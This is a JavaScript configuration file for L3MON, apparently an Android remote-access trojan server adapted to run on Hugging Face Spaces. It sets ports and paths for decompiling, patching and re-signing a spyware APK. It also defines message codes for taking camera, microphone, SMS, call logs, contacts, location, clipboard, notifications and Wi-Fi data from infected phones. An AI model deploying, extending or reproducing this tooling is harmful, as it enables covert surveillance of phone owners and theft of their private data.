const path = require('path');

// Writable directory in Hugging Face Spaces
const writableDir = '/tmp';

exports.debug = false;

// Use Space's runtime port
exports.web_port = process.env.PORT || 7860;
exports.control_port = 22222;

// Paths moved to writable /tmp
exports.apkBuildPath = path.join(writableDir, 'build.apk');
exports.apkSignedBuildPath = path.join(writableDir, 'L3MON.apk');

exports.downloadsFolder = '/client_downloads';
exports.downloadsFullPath = path.join(writableDir, exports.downloadsFolder);

// Tools can stay in app folder (read-only is fine for reading)
exports.apkTool = path.join(__dirname, '../app/factory/', 'apktool.jar');
exports.apkSign = path.join(__dirname, '../app/factory/', 'sign.jar');

// Smali output must also be in /tmp
exports.smaliPath = path.join(writableDir, 'decompiled');
exports.patchFilePath = path.join(exports.smaliPath, '/smali/com/etechd/l3mon/IOSocket.smali');

exports.buildCommand = `java -jar "${exports.apkTool}" b "${exports.smaliPath}" -o "${exports.apkBuildPath}"`;
exports.signCommand = `java -jar "${exports.apkSign}" "${exports.apkBuildPath}"`;

exports.messageKeys = {
    camera: '0xCA',
    files: '0xFI',
    call: '0xCL',
    sms: '0xSM',
    mic: '0xMI',
    location: '0xLO',
    contacts: '0xCO',
    wifi: '0xWI',
    notification: '0xNO',
    clipboard: '0xCB',
    installed: '0xIN',
    permissions: '0xPM',
    gotPermission: '0xGP'
};

exports.logTypes = {
    error: { name: 'ERROR', color: 'red' },
    alert: { name: 'ALERT', color: 'amber' },
    success: { name: 'SUCCESS', color: 'limegreen' },
    info: { name: 'INFO', color: 'blue' }
};
